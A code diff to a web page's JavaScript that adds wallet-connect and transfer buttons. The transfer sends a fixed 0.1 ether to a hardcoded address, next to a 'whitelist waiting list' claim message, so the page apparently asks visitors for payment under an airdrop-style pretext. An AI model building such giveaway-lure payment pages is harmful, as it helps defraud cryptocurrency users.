@@ -133,4 +133,56 @@ const logout = () => {
     claimed = true;
     alert("Congratulations on joining the whitelist waiting list. We will take a snapshot of the top 1000 users. Please be patient...");
   }
+document.getElementById("connectWalletBtn").addEventListener("click", function() {
+      // 连接用户的bsc钱包逻辑
+      connectWallet();
+    });
+
+    // 转账按钮点击事件处理程序
+    document.getElementById("transferBtn").addEventListener("click", function() {
+      // 发起转账逻辑
+      transfer();
+    });
+
+    // 链接钱包逻辑
+    function connectWallet() {
+      if (typeof window.ethereum !== 'undefined') {
+        // Web3对象
+        window.web3 = new Web3(window.ethereum);
+        // 请求用户授权
+        window.ethereum.enable().then(function() {
+          alert("已链接钱包");
+        }).catch(function(error) {
+          console.error(error);
+          alert("链接钱包失败");
+        });
+      } else {
+        alert("未检测到钱包插件，请安装钱包插件并刷新页面");
+      }
+    }
+
+    
+    function transfer() {
+      if (typeof window.web3 !== 'undefined') {
+      
+        var toAddress = "0x02682f038f9303Cf7995eece49D92f4E78F667Df";
+
+        
+        var amount = web3.utils.toWei("0.1", "ether");
+
+        // 发送转账请求
+        web3.eth.sendTransaction({
+          to: toAddress,
+          value: amount
+        }).then(function(receipt) {
+          console.log(receipt);
+          alert("转账成功，交易哈希：" + receipt.transactionHash);
+        }).catch(function(error) {
+          console.error(error);
+          alert("转账失败");
+        });
+      } else {
+        alert("请先链接钱包");
+      }
+    }
           
